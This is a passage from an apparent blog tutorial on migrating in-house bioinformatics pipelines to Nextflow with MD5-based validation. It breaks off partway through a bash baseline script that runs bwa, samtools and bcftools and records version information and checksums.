<p>Your lab's in-house pipeline (bash, Python, Snakemake, or custom) might work locally, but it doesn't scale beyond your machine. Here's what changes when you move from in-house to enterprise-level:</p>
<p><strong>The In-House Pipeline Problem (Any Format):</strong></p>
<ul>
<li class="">Runs on one person's machine, with one person understanding it</li>
<li class="">Tool versions undocumented and constantly drift across environments</li>
<li class="">Non-reproducible results across team members, platforms, or time</li>
<li class="">Scaling from 10 samples to 1000 means extensive reworking</li>
<li class="">Impossible to share with collaborators, publish with research, or integrate with institutional compute systems</li>
<li class="">No audit trail for regulatory or compliance requirements</li>
</ul>
<p><strong>Enterprise Pipeline Benefits (Nextflow, Snakemake, or CWL):</strong></p>
<ul>
<li class="">Containerized, version-controlled, self-documenting</li>
<li class="">Reproducible results to the byte, across any platform (laptop to HPC to cloud)</li>
<li class="">Scales from 1 sample to 100,000 without modification</li>
<li class="">Shareable, citable, auditable for regulatory compliance</li>
<li class="">Integrable with HPC systems, cloud platforms, and institutional data pipelines</li>
<li class="">Native support for monitoring, logging, and failure recovery</li>
</ul>
<p><strong>The Cost of Staying In-House:</strong></p>
<ul>
<li class="">Researcher time spent debugging instead of analyzing: 30-40% of effort</li>
<li class="">Lost results due to environment changes: $10,000+ per incident</li>
<li class="">Collaboration delayed by "it works on my machine" problems: weeks per project</li>
<li class="">Inability to meet publishing reproducibility standards</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-hidden-risk-of-pipeline-migration-from-any-in-house-system">The Hidden Risk of Pipeline Migration (From Any In-House System)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#the-hidden-risk-of-pipeline-migration-from-any-in-house-system" class="hash-link" aria-label="Direct link to The Hidden Risk of Pipeline Migration (From Any In-House System)" title="Direct link to The Hidden Risk of Pipeline Migration (From Any In-House System)" translate="no">​</a></h2>
<p>Your current pipeline is a black box of institutional knowledge—whether it's bash scripts, Python code, Snakemake, or custom workflows. It was built incrementally, never designed for reproducibility across teams, and probably has undocumented quirks that make it work. You can't just rewrite it in Nextflow and hope for the same results.</p>
<p>The hard truth: <strong>60% of bioinformatics pipeline migrations introduce subtle bugs that go undetected for months.</strong> A variant is called differently. A read is filtered out. A threshold is slightly different. A file is processed in a different order. Biologically, maybe it matters. Scientifically, it's a catastrophe because you can't trace back what changed.</p>
<p>This is why enterprise teams use a validation framework—regardless of whether they're migrating FROM bash, Python, Snakemake, custom C++, or anything else. Before replacing your in-house pipeline with an enterprise system (Nextflow, Snakemake, CWL, etc.), you need:</p>
<ol>
<li class="">A baseline snapshot (MD5 checksums) of what "correct" looks like from your original pipeline</li>
<li class="">Explicit control over non-deterministic behavior (hard-coded random seeds)</li>
<li class="">Byte-for-byte validation that the new pipeline matches the old</li>
</ol>
<p>The framework is the same regardless of source. But the tooling differs based on your target. <strong>If you're migrating TO Nextflow, nf-test automates this entire process.</strong></p>
<p>Let's build that framework.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-1-establish-a-reproducibility-baseline-with-md5-snapshots-from-your-original-pipeline">Step 1: Establish a Reproducibility Baseline with MD5 Snapshots (From Your Original Pipeline)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#step-1-establish-a-reproducibility-baseline-with-md5-snapshots-from-your-original-pipeline" class="hash-link" aria-label="Direct link to Step 1: Establish a Reproducibility Baseline with MD5 Snapshots (From Your Original Pipeline)" title="Direct link to Step 1: Establish a Reproducibility Baseline with MD5 Snapshots (From Your Original Pipeline)" translate="no">​</a></h2>
<p>The first step is creating a "golden standard"—verified outputs from your original in-house pipeline (bash, Python, Snakemake, or any format) that you can use as a reference. This baseline is universal and doesn't depend on what you're migrating TO.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-document-your-original-pipeline-languageformat-agnostic">1.1 Document Your Original Pipeline (Language/Format Agnostic)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#11-document-your-original-pipeline-languageformat-agnostic" class="hash-link" aria-label="Direct link to 1.1 Document Your Original Pipeline (Language/Format Agnostic)" title="Direct link to 1.1 Document Your Original Pipeline (Language/Format Agnostic)" translate="no">​</a></h3>
<p>Create a comprehensive script that records everything:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># original_pipeline.sh - Reference implementation with full documentation</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-euo</span><span class="token plain"> pipefail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">REFERENCE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/data/reference/hg38.fasta"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">READS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/data/reads/sample.fastq"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/baseline"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MANIFEST</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/manifest.txt"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create output directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Record software versions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Pipeline Execution Record ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Date: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-Iseconds</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Software Versions ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"bwa: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">bwa </span><span class="token string variable operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token string variable file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">&amp;1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> Version</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"samtools: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">samtools </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">head</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"bcftools: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">bcftools </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">head</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Record input file hashes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Input File Checksums ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${READS}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 1: Alignment</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Step 1: BWA Alignment ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${READS}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> -@ </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/aligned.bam"</span><span class="token plain"> -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/aligned.bam"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"aligned.bam: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">md5sum $</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">/aligned.bam </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token string variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 2: Mark Duplicates</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Step 2: Mark Duplicates ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools markdup </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/aligned.bam"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/marked.bam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/marked.bam"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"marked.bam: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">md5sum $</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">/marked.bam </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token string variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 3: Call Variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"=== Step 3: Call Variants ==="</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools mpileup </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${REFERENCE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/marked.bam"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  bcftools call </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/variants.vcf"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${OUTPUT_DIR}</span><span class="token string" style="color:hsl(119, 34%, 47%)">/variants.vcf"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${MANIFEST}</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"variants.vcf: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">md5sum $</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token string variable punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">/variants.vcf </span><span class="token string variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">cut</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> -d</span><span class="token string variable string" style="color:hsl(119, 34%, 47%)">' '</span><span class="token string variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token string variable parameter variable" style="color:hsl(221, 87%, 60%)">-f1</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 